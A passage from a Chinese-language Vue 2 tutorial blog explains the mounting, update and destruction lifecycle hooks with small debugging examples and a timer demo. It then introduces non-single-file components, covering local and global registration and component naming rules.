<h3 id="1-20-2-生命周期挂载流程"><a href="#1-20-2-生命周期挂载流程" class="headerlink" title="1.20.2.生命周期挂载流程"></a>1.20.2.生命周期挂载流程</h3><img src="image-20220524063122391-16533538861672.png" alt="image-20220524063122391" style="zoom:40%;" />

<ul>
<li><p><code>new VUe()</code></p>
<ul>
<li>创建<code>Vue</code>实例</li>
</ul>
</li>
<li><p><code>init Event &amp; Lifecycle</code>（知道一下，干预不了）</p>
<ul>
<li><p>初始化：生命周期、事件，但数据代理还未开始</p>
<ul>
<li><p>如定义好生命周期函数有哪些、什么时候调用</p>
</li>
<li><p>如遇到了事件的<code>once</code>修饰符，应该怎么处理</p>
</li>
<li><p>此时<code>Vue</code>实例上还没有<code>_data</code></p>
</li>
</ul>
</li>
</ul>
</li>
<li><p><code>beforeCreate</code>（生命周期函数）</p>
<ul>
<li><p>初始化生命周期、事件之后，会立刻调用<code>beforeCreate</code>生命周期函数</p>
<ul>
<li><code>before</code>表示，在数据监测和数据代理之前</li>
</ul>
</li>
<li><p>此时，无法通过<code>vm</code>访问到<code>data</code>中的数据、<code>methods</code>中的方法</p>
<ul>
<li><p>我们在<code>beforeCreate</code>函数中，打印<code>vm</code>实例，并设置断点查看：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;beforeCreate&#x27;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>)</span><br><span class="line"><span class="keyword">debugger</span></span><br></pre></td></tr></table></figure>

<p>可以看到，此时<code>vm</code>身上并没有<code>_data</code></p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220524065609916.png" alt="image-20220524065609916"></p>
</li>
<li><p>可以利用断点，进行调用堆栈及本地作用域分析</p>
</li>
</ul>
</li>
</ul>
</li>
<li><p><code>init injections &amp; reactivity</code></p>
<ul>
<li><p>初始化：数据监测、数据代理</p>
</li>
<li><p>监测对象变化、监测数组变化</p>
</li>
<li><p>一旦完成了上述操作，调用<code>created</code>回调函数</p>
</li>
</ul>
</li>
<li><p><code>created</code>（生命周期函数）</p>
<ul>
<li><p>在数据监测和数据代理创建完毕后调用</p>
</li>
<li><p>此时，可以通过<code>vm</code>访问<code>data</code>中的数据、<code>method</code>中配置的方法</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">created</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;created&#x27;</span>, <span class="variable language_">this</span>)</span><br><span class="line">    <span class="keyword">debugger</span></span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220524101817856.png" alt="image-20220524101817856"></p>
</li>
</ul>
</li>
<li><p>判断配置项中是否有<code>el</code>配置项。此阶段<code>Vue</code>开始解析模板，生成虚拟<code>dom</code>（内存中），页面还不能显示解析好的内容（显示的是模板）</p>
<ul>
<li><p><code>Yes</code>：判断<code>temmplate</code>配置项</p>
</li>
<li><p><code>No</code>：<code>when vm.$mounted(el) is called</code>，如果没有配置<code>el</code>，则会去调用<code>mounted</code></p>
<ul>
<li><p>备注：如果没写<code>el</code>，也没有调<code>vm.$mounted</code>，则到这一步就不会继续进行了，即不会解析模板，只会执行<code>beforeCreate</code>和<code>created</code>两个生命周期函数</p>
</li>
<li><p>判断是否有<code>template</code>配置项</p>
<ul>
<li><p><code>Yes</code>：<code>Compile template into render function</code>，把<code>template</code>配置项编译到<code>render</code>函数中</p>
<ul>
<li><p>容器里面可以什么都不写，使用<code>template</code>配置项</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">template</span>: <span class="string">`</span></span><br><span class="line"><span class="string">	&lt;div&gt;</span></span><br><span class="line"><span class="string">		&lt;h2&gt;Hello World&lt;/h2&gt;</span></span><br><span class="line"><span class="string">	&lt;/div&gt;</span></span><br><span class="line"><span class="string">`</span></span><br></pre></td></tr></table></figure>

<p>会用<code>template</code>值，完全替换调根节点</p>
</li>
</ul>
</li>
<li><p><code>No</code>：<code>Compiler el&#39;s outHTML as template</code>，编译<code>el</code>外部<code>HTML</code>（包含选择器的那个元素）整体作为模板（可以在该节点上单向绑定验证一下是否被渲染）</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p><code>beforeMount</code>（生命周期函数）</p>
<ul>
<li><p>此时页面呈现的是，未经<code>Vue</code>编译的<code>dom</code>结构</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">beforeMount</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>)</span><br><span class="line">    <span class="keyword">debugger</span></span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220524190708042.png" alt="image-20220524190708042"></p>
</li>
<li><p>所有对<code>dom</code>的操作，最终都不奏效</p>
<ul>
<li>因为再怎么修改，下一步会把已经定义好的虚拟<code>dom</code>转为真实<code>dom</code>，并插入页面</li>
</ul>
</li>
</ul>
</li>
<li><p><code>Create vm.$el and replace &#39;el&#39; with it</code>：在<code>vm</code>身上创建<code>$el</code>选项并且用它替换掉整个<code>el</code>容器里的东西</p>
<ul>
<li><p>将内存中的虚拟<code>dom</code>转为真实<code>dom</code>插入页面</p>
</li>
<li><p>转为真实<code>dom</code>后，在<code>vm.$el</code>上将真实<code>dom</code>存了一份</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">mounted</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">$el</span>)</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">$el</span> <span class="keyword">instanceof</span> <span class="title class_">HTMLElement</span>)</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220525062359038.png" alt="image-20220525062359038"></p>
</li>
</ul>
</li>
<li><p><code>mounted</code></p>
<ul>
<li><p>此时页面中呈现的是经过<code>vue</code>编译的<code>dom</code></p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220524191003284.png" alt="image-20220524191003284"></p>
</li>
<li><p>对<code>dom</code>的操作均有效（尽可能避免）</p>
</li>
<li><p>至此初始化过程结束，一般在此进行：</p>
<ul>
<li>开启定时器</li>
<li>发送网络请求</li>
<li>订阅消息</li>
<li>绑定自定义事件</li>
<li>等其他初始化操作</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="1-20-3-生命周期更新流程"><a href="#1-20-3-生命周期更新流程" class="headerlink" title="1.20.3.生命周期更新流程"></a>1.20.3.生命周期更新流程</h3><ul>
<li><p>当数据改变时</p>
<ul>
<li><p><code>beforeUpdate</code>（生命周期函数）</p>
<ul>
<li><p>更改数据之前</p>
</li>
<li><p>此时，数据是新的，但是页面是就旧的。即：页面尚未和数据保持同步</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">beforeUpdate</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">n</span>)</span><br><span class="line">    <span class="keyword">debugger</span></span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>



<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220525063143539.png" alt="image-20220525063143539"></p>
</li>
</ul>
</li>
<li><p><code>Virtual DOM re-render and patch</code></p>
<ul>
<li>根据新数据，生成新的虚拟<code>DOM</code>，随后与旧的虚拟<code>DOM</code>进行比较，最终完成页面更新。即：完成了<code>Model ==&gt; View</code>的更新</li>
</ul>
</li>
<li><p><code>updated</code>（生命周期函数）</p>
<ul>
<li><p>此时，数据是新的，页面也是新的。即：页面和数据保持同步</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">updated</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">n</span>)</span><br><span class="line">    <span class="keyword">debugger</span></span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220525063559008.png" alt="image-20220525063559008"></p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="1-20-4-生命周期销毁流程"><a href="#1-20-4-生命周期销毁流程" class="headerlink" title="1.20.4.生命周期销毁流程"></a>1.20.4.生命周期销毁流程</h3><ul>
<li>当调用<code>vm.$destroy()</code>时：完全销毁一个实例，清理它与其他实例的连接，解绑它的全部指令及事件监听器（移出的是自定义事件，而不是原生的<code>dom</code>事件）<ul>
<li><code>beforeDestroy</code>（生命周期函数）<ul>
<li>此时：<code>vm</code>中所有的<code>data</code>、<code>methods</code>、指令等等，都处于可用状态，马上要执行销毁过程，一般在此阶段关闭定时器、取消订阅消息、解绑自定义事件等收尾操作</li>
<li>对数据进行的所有操作，都不会再触发更新</li>
</ul>
</li>
<li><code>TearDown watches, child components and event listeners</code><ul>
<li>移出监视、组件和自定义事件监听器</li>
</ul>
</li>
<li><code>destoryed</code></li>
</ul>
</li>
</ul>
<h3 id="1-20-5-小结：生命周期"><a href="#1-20-5-小结：生命周期" class="headerlink" title="1.20.5.小结：生命周期"></a>1.20.5.小结：生命周期</h3><ul>
<li>常用的生命周期钩子<ul>
<li><code>mounted</code>：发送<code>ajax</code>请求、启动定时器、绑定自定义事件、订阅消息等<strong>初始化操作</strong></li>
<li><code>beforeDestroy</code>：清除定时器、解绑自定义事件、取消订阅消息等<strong>收尾操作</strong></li>
</ul>
</li>
<li>关于销毁<code>Vue</code>实例<ul>
<li>销毁后借助<code>Vue</code>开发者工具看不到任何信息</li>
<li>销毁后自定义事件会失效，但原生<code>DOM</code>事件依然有效</li>
<li>一般不会在<code>beforeDestroy</code>中操作数据，因为即使操作数据，也不会再触发更新流程了</li>
</ul>
</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span> <span class="attr">:style</span>=<span class="string">&quot;&#123;opacity&#125;&quot;</span>&gt;</span>Hello World<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;opacity=1&quot;</span>&gt;</span>设置透明度为1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;stop&quot;</span>&gt;</span>点击停止变换<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">Vue</span>.<span class="property">config</span>.<span class="property">productionTip</span> = <span class="literal">false</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> vm = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">el</span>: <span class="string">&#x27;#app&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">data</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">n</span>: <span class="number">1</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">name</span>: <span class="string">&#x27;sai&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">            <span class="attr">opacity</span>: <span class="number">1</span></span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="attr">methods</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">stop</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">this</span>.$destroy()</span></span><br><span class="line"><span class="language-javascript">            &#125;,</span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">mounted</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;mounted&#x27;</span>, <span class="variable language_">this</span>)</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">this</span>.<span class="property">timer</span> = <span class="built_in">setInterval</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;setInterval&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">this</span>.<span class="property">opacity</span> -= <span class="number">0.01</span></span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">if</span>(<span class="variable language_">this</span>.<span class="property">opacity</span> &lt;= <span class="number">0</span> ) <span class="variable language_">this</span>.<span class="property">opacity</span> = <span class="number">1</span></span></span><br><span class="line"><span class="language-javascript">            &#125;, <span class="number">16</span>)</span></span><br><span class="line"><span class="language-javascript">        &#125;,</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">beforeDestroy</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;vm即将销毁&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">            <span class="built_in">clearInterval</span>(<span class="variable language_">this</span>.<span class="property">timer</span>)</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    &#125;)</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="2-Vue组件化编程"><a href="#2-Vue组件化编程" class="headerlink" title="2.Vue组件化编程"></a>2.<code>Vue</code>组件化编程</h1><h2 id="2-1-模块与组件、模块化与组件化"><a href="#2-1-模块与组件、模块化与组件化" class="headerlink" title="2.1.模块与组件、模块化与组件化"></a>2.1.模块与组件、模块化与组件化</h2><h3 id="2-1-1-模块"><a href="#2-1-1-模块" class="headerlink" title="2.1.1.模块"></a>2.1.1.模块</h3><ul>
<li>理解：向外提供特定功能的<code>js</code>程序，一般就是一个<code>js</code>文件</li>
<li>为什么要使用模块：<code>js</code>文件很多很杂<ul>
<li>从编程者文件构建梳理，文件的角度</li>
</ul>
</li>
<li>使用模块的作用：简化<code>js</code>的编写，提高<code>js</code>运行效率</li>
</ul>
<h3 id="2-1-2-组件"><a href="#2-1-2-组件" class="headerlink" title="2.1.2.组件"></a>2.1.2.组件</h3><ul>
<li>理解：用来实现局部（特定）功能效果的代码集合（<code>html/css/js/images/...</code>）<ul>
<li>就是功能集合</li>
</ul>
</li>
<li>为什么要使用组件：一个界面的功能很复杂<ul>
<li>从应用界面构建，代码的角度</li>
</ul>
</li>
<li>作用：复用编码，简化项目编码编码，提高运行效率</li>
</ul>
<p>传统方式编写应用，一个<code>html</code>页面会对应很多<code>css</code>和<code>js</code>文件，并且如果不同的页面，有相同的地方，唯一能做的就是<code>复制/粘贴</code>代码或文件，存在的问题：1.每个页面的依赖关系混乱，不好维护。2.代码复用率不高</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220525160941885.png" alt="image-20220525160941885"></p>
<p>模块化就是为了解决上述问题的。</p>
<p>使用组件方式编写应用：</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220525161213001.png" alt="image-20220525161213001"></p>
<p>所有的组件，必须听一个大哥<code>vm</code>的指挥</p>
<p><img src="/2022/07/25/web/JavaScript/vue_%E6%95%99%E7%A8%8B3/image-20220525161829412.png" alt="image-20220525161829412"></p>
<p>组件的定义：实现应用中<strong>局部</strong>功能<strong>代码</strong>和<strong>资源</strong>的<strong>集合</strong></p>
<h3 id="2-1-3-模块化"><a href="#2-1-3-模块化" class="headerlink" title="2.1.3.模块化"></a>2.1.3.模块化</h3><p>当应用中的<code>js</code>都以模块来编写的，那么这个应用就是一个模块化应用</p>
<h3 id="2-1-4-组件化"><a href="#2-1-4-组件化" class="headerlink" title="2.1.4.组件化"></a>2.1.4.组件化</h3><p>当应用中的功能都是多组件方式来编写的，那么这个应用就是一个组件化应用</p>
<h2 id="2-2-非单文件组件"><a href="#2-2-非单文件组件" class="headerlink" title="2.2.非单文件组件"></a>2.2.非单文件组件</h2><h3 id="2-2-1-局部组件"><a href="#2-2-1-局部组件" class="headerlink" title="2.2.1.局部组件"></a>2.2.1.局部组件</h3><ul>
<li><p>会用<code>Vue.extend()</code>方法创建组件，并传入一个配置对象</p>
</li>
<li><p>该配置对象都是用来控制组件中的内容的</p>
<ul>
<li>这个配置项，和之前的实例化的配置对象，几乎是一样的</li>
<li>组件定义时，不能配置<code>el</code>，因为只能有一个大哥<code>vm</code>，最终所有的组件都要被一个<code>vm</code>管理，由<code>vm</code>决定服务于哪个容器</li>
<li><code>data</code>配置项，需要写成一个函数，函数里面返回配置对象，保证数据隔离</li>
</ul>
</li>
<li><p>第一步：创建组件</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> school = <span class="title class_">Vue</span>.<span class="title function_">extend</span>(&#123;</span><br><span class="line">    <span class="title function_">data</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&#x27;test&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> student = <span class="title class_">Vue</span>.<span class="title function_">extend</span>(&#123;</span><br><span class="line">    <span class="title function_">data</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&#x27;student&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
</li>
<li><p>第二步：注册组件</p>
<p>在<code>vm</code>的<code>options</code>中，新增<code>components</code>配置对象（局部注册）</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">	<span class="attr">el</span>: <span class="string">&quot;#root&quot;</span>,</span><br><span class="line">	<span class="attr">components</span>: &#123;</span><br><span class="line">		school,</span><br><span class="line">        student</span><br><span class="line">	&#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<p>我们分析生命周期流程时候，如果没有<code>el</code>配置项，则会去找<code>template</code>配置项，对于组件我们可以配置<code>template</code>作为模板</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> school = <span class="title class_">Vue</span>.<span class="title function_">extend</span>(&#123;</span><br><span class="line">    <span class="attr">template</span>: <span class="string">`</span></span><br><span class="line"><span class="string">    	&lt;div&gt;</span></span><br><span class="line"><span class="string">    		学校姓名：&#123;&#123;name&#125;&#125;</span></span><br><span class="line"><span class="string">    	&lt;/div&gt;</span></span><br><span class="line"><span class="string">    `</span>,</span><br><span class="line">    <span class="title function_">data</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&#x27;test&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> student = <span class="title class_">Vue</span>.<span class="title function_">extend</span>(&#123;</span><br><span class="line">    <span class="attr">template</span>: <span class="string">`</span></span><br><span class="line"><span class="string">    	&lt;div&gt;</span></span><br><span class="line"><span class="string">    		学生姓名：&#123;&#123;name&#125;&#125;</span></span><br><span class="line"><span class="string">    	&lt;/div&gt;</span></span><br><span class="line"><span class="string">    `</span>,</span><br><span class="line">    <span class="title function_">data</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&#x27;student&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
</li>
<li><p>第三步：使用组件</p>
<p>编写组件标签</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">school</span>&gt;</span><span class="tag">&lt;/<span class="name">school</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">student</span>&gt;</span><span class="tag">&lt;/<span class="name">student</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="2-2-2-全局组件"><a href="#2-2-2-全局组件" class="headerlink" title="2.2.2.全局组件"></a>2.2.2.全局组件</h3><p>第一步，还是先定义<code>hello</code></p>
<p>第二步：使用<code>Vue.component()</code>注册全局组件</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Vue</span>.<span class="title function_">component</span>(<span class="string">&#x27;hello&#x27;</span>, hello)</span><br></pre></td></tr></table></figure>

<p>第三步，此时可以直接在多个<code>vm</code>编写组件标签</p>
<h3 id="2-2-3-小结：非单文件组件"><a href="#2-2-3-小结：非单文件组件" class="headerlink" title="2.2.3.小结：非单文件组件"></a>2.2.3.小结：非单文件组件</h3><ul>
<li><code>Vue</code>中使用组件的三大步骤<ul>
<li>一、定义组件（创建组件）<ul>
<li>编写<code>template</code>配置项</li>
</ul>
</li>
<li>二、注册组件<ul>
<li>局部注册：使用<code>vm</code>的<code>components</code>配置项</li>
<li>全局注册：使用<code>Vue.component()</code>方法</li>
</ul>
</li>
<li>三、使用组件<ul>
<li>根模板中，编写组件标签</li>
</ul>
</li>
</ul>
</li>
<li>如何定义组件？<ul>
<li>使用<code>Vue.extend(options)</code>创建，其中<code>options</code>和<code>new Vue(options)</code>时传入的配置对象基本一致，但也有区别，区别如下：<ul>
<li><code>el</code>不用写<ul>
<li>因为最终所有的组件都要经过一个<code>vm</code>的管理，由<code>vm</code>中的<code>el</code>决定服务哪个容器</li>
</ul>
</li>
<li><code>data</code>必须写成函数<ul>
<li>避免组件被复用时，数据存在引用关系</li>
</ul>
</li>
</ul>
</li>
<li>使用<code>template</code>可以配置组件结构</li>
</ul>
</li>
<li>如何注册组件？<ul>
<li>局部注册：<code>new Vue</code>时传入<code>components</code>配置项</li>
<li>全局注册：使用<code>Vue.component(&#39;组件名&#39;, 组件)</code>方法</li>
</ul>
</li>
<li>如何使用组件？<ul>
<li>编写组件标签：<code>&lt;school&gt;&lt;/school&gt;</code></li>
</ul>
</li>
</ul>
<h3 id="2-2-4-使用组件的几个注意点"><a href="#2-2-4-使用组件的几个注意点" class="headerlink" title="2.2.4.使用组件的几个注意点"></a>2.2.4.使用组件的几个注意点</h3><p>注册组件时，</p>
<ul>
<li><p>如果组件名是一个单词</p>
<ul>
<li>如果是小写的，组件标签也是小写</li>
<li>如果组件名是大写的，组件标签也是大写，建议大写，和开发者工具对应</li>
</ul>
</li>
<li><p>如果组件名是多个单词</p>
<ul>
<li>组件名若是<code>my-school</code>，组件标签写成<code>&lt;my-school&gt;&lt;/my-school&gt;</code></li>
<li>组件名若是<code>MySchool</code>，组件标签写成<code>&lt;MySchool&gt;&lt;/MySchool&gt;</code><ul>
<li>如果不是用的脚手架，则会报错</li>
<li>用脚手架的话，建议这种写法</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>小结：</p>
<ul>
<li><p>关于组件名</p>
<ul>
<li>一个单词组成<ul>
<li>第一种写法（首字母小写）：<code>school</code></li>
<li>第二种写法（首字母大写）：<code>School</code></li>
</ul>
</li>
<li>多个单词组成<ul>
<li>第一种写法（<code>kebab-case</code>命名）：<code>my-school</code></li>
<li>第二种写法（<code>CamelCase</code>命名）：<code>MySchool</code>，需要<code>vue-cli</code>支持</li>
</ul>
</li>
<li>备注：<ul>
<li>组件名尽可能回避<code>HTML</code>中已有元素的名称，如<code>h2</code>、<code>H2</code>都不行</li>
